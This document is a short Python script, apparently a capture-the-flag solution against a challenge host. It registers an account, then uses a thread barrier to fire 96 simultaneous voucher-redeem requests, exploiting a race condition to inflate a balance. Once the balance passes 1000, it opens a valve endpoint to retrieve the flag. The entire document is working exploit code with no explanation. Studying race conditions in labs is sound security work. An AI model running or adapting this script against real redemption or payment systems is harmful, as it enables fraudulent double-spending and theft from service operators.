import concurrent.futures, threading, uuid, requests, re

base = "http://web.secleaf.xyz:8880"
burst = 96

s = requests.Session()
uname = f"u_{uuid.uuid4().hex[:6]}"
s.post(f"{base}/register", data={"username": uname, "password": "Password123!"})

cookies = s.cookies.get_dict()
clients = [requests.Session() for _ in range(burst)]
for c in clients:
    c.cookies.update(cookies)

barrier = threading.Barrier(burst)

def send(c):
    barrier.wait()
    try:
        return c.post(f"{base}/voucher/redeem", timeout=10).status_code
    except:
        return 0

with concurrent.futures.ThreadPoolExecutor(max_workers=burst) as pool:
    list(pool.map(send, clients))

page = s.get(f"{base}/").text
litres = int(re.search(r'<b id="litres">(\d+)</b>', page).group(1))
if litres >= 1000:
    r = s.post(f"{base}/valve/open").json()
    print(r.get("flag"))
